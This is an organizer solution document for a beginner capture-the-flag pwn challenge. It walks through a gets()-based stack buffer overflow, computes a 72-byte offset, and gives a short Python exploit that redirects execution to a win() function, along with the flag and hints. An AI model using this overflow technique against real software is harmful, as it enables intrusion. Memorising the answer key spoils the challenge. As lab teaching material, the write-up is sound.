# PWN-01 — BROKEN TERMINAL: Organizer Solution Document

## Challenge Metadata
- **ID**: PWN-01
- **Title**: BROKEN TERMINAL
- **Category**: Pwn
- **Difficulty**: Beginner / Intermediate
- **Points**: 100
- **Estimated solve time**: 20–30 minutes

## Vulnerability & Concept
- **Vulnerability**: Stack buffer overflow via un-bounded `gets(buffer)` call in `process_terminal()`.
- **Mitigations**: No Canary (`-fno-stack-protector`), No PIE (`-no-pie`), NX Enabled.

## Exact Exploitation Path
1. Disassemble `broken_terminal` using `objdump -d` or `gdb` to find the static entry address of `win()` (`0x4011d6`).
2. Buffer size in `process_terminal` is 64 bytes (`char buffer[64]`).
3. Total offset to saved RIP is 72 bytes (64-byte buffer + 8-byte saved RBP).
4. Construct payload: 72 bytes of padding + 8-byte little-endian address of `win()`.

## Python Exploit Script
```python
import subprocess, struct

win_addr = 0x4011d6
payload = b'A' * 72 + struct.pack('<Q', win_addr)

p = subprocess.Popen(['./broken_terminal'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
out, _ = p.communicate(input=payload)
print(out.decode())
```

## Recovered Evidence & Flag
- **Flag**: `flag{Stack_Buffer_Overflow_Win_Path}`

## Hints
1. Use objdump or GDB to inspect broken_terminal. Locate the win() function address and calculate the buffer offset in process_terminal.
2. The input buffer size is 64 bytes. Adding 8 bytes for saved RBP requires a 72-byte offset before overwriting the return address.
3. Construct a payload of 72 'A' bytes followed by the 64-bit little-endian address of win() to trigger flag output.
